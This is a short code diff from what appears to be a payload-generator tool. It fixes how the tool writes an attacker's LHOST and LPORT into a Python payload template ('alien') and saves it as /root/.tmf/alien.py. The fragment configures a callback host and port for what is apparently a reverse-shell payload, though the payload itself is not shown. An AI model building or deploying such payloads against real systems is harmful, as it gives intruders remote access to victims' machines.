@@ -321,8 +321,8 @@ Handler Details:
                     for line in alien:
                       data = alien.read()
                       print(Fore.YELLOW+'[+]'+Fore.RESET+' Changing LHOST, LPORT...')
-                      data.replace('HOST    = "YOUR IP"', f'HOST    = "{LHOST}"')
-                      data.replace('PORT    = 4556', f'PORT    = {LPORT}')
+                      data = data.replace('HOST    = "YOUR IP"', f'HOST    = "{LHOST}"')
+                      data = data.replace('PORT    = 4556', f'PORT    = {LPORT}')
                 print(Fore.BLUE+'[*]'+Fore.RESET+' Saving Payload As .PY...')
                 os.system('touch /root/.tmf/alien.py > /dev/null 2>&1')
                 with open('/root/.tmf/alien.py', 'w') as alien_load:
